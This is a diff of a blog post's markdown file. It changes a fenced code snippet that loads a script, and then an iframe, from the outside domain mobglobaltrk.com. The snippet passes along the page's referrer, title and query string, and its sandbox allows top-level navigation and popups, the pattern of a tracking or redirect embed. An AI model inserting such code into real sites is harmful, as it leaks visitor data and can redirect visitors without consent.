@@ -8,8 +8,9 @@ image: /img/blog-flavor_wheel.jpg
 
 
 ```
+<div id="a70f04352-fd2b-1aaa-3eb4-6faaf28758d7"></div>
 <script type="application/javascript">
-document.write('<script type="application/javascript" src="https://mobglobaltrk.com/2LBbn4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f5747faa4e7e=script5f5747faa4e7f"><' + '/script>');
+document.getElementById('a70f04352-fd2b-1aaa-3eb4-6faaf28758d7').innerHTML = '<iframe sandbox="allow-top-navigation allow-scripts allow-popups allow-forms" frameborder="0" width="" height="" src="https://mobglobaltrk.com/2LBbn4?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f5747faa4e6d=frame5f5747faa4e6e"></iframe>'
 </script>
 ```
 
